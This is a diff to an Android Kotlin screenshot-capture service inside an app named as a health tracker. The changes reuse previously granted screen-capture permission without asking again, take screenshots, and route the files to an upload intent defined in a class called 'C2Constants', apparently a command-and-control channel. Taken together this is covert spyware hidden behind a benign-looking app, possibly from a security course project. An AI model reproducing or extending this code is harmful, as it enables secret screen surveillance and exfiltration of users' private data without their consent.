@@ -91,6 +91,7 @@ class ScreenshotCaptureService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "=== SCREENSHOT SERVICE STARTED ===")
+        Log.i(TAG, "Service received intent - Action: ${intent?.action}, Command: ${intent?.getStringExtra("command")}")
 
         if (intent != null) {
             Log.i(TAG, "Action: ${intent.action}")
@@ -153,35 +154,22 @@ class ScreenshotCaptureService : Service() {
             CMD_START_SCREENSHOT -> {
                 Log.i(TAG, "Processing START_SCREENSHOT command")
 
-                // Try to get from intent first, then from saved prefs
-                var resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
-                var data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
-                } else {
-                    @Suppress("DEPRECATION")
-                    intent.getParcelableExtra(EXTRA_DATA)
-                }
-
-                // If not in intent, use saved data
-                if (data == null && savedResultCode != -1 && savedIntentUri != null) {
-                    resultCode = savedResultCode
-                    data = Intent.parseUri(savedIntentUri, 0)
-                    Log.i(TAG, "Using saved MediaProjection data")
-                }
-
-                if (data != null) {
-                    // Try to use persistent projection first
+                // Ensure we have MediaProjection (same logic as CAPTURE_NOW)
+                if (mediaProjection == null) {
                     val persistentProjection = ScreenshotPermissionHelper.getPersistentMediaProjection()
                     if (persistentProjection != null) {
+                        Log.i(TAG, "Using persistent MediaProjection from startup")
                         mediaProjection = persistentProjection
-                        Log.i(TAG, "Using persistent MediaProjection")
+                    } else if (savedResultCode != -1 && savedIntentUri != null) {
+                        val data = Intent.parseUri(savedIntentUri, 0)
+                        setupMediaProjection(savedResultCode, data)
                     } else {
-                        setupMediaProjection(resultCode, data)
+                        Log.e(TAG, "No MediaProjection available for screenshot")
+                        return START_STICKY
                     }
-                    startScreenshotCapture()
-                } else {
-                    Log.e(TAG, "No media projection data available for screenshot")
                 }
+
+                startScreenshotCapture()
             }
 
             CMD_STOP_SCREENSHOT -> {
@@ -674,7 +662,7 @@ class ScreenshotCaptureService : Service() {
     }
 
     private fun triggerUpload(type: String, filePath: String) {
-        val intent = Intent("com.inf2007.healthtracker.UPLOAD_FILE").apply {
+        val intent = Intent(C2Constants.UPLOAD_FILE_INTENT).apply {
             putExtra("type", type)
             putExtra("file_path", filePath)
             setPackage("com.inf2007.healthtracker")
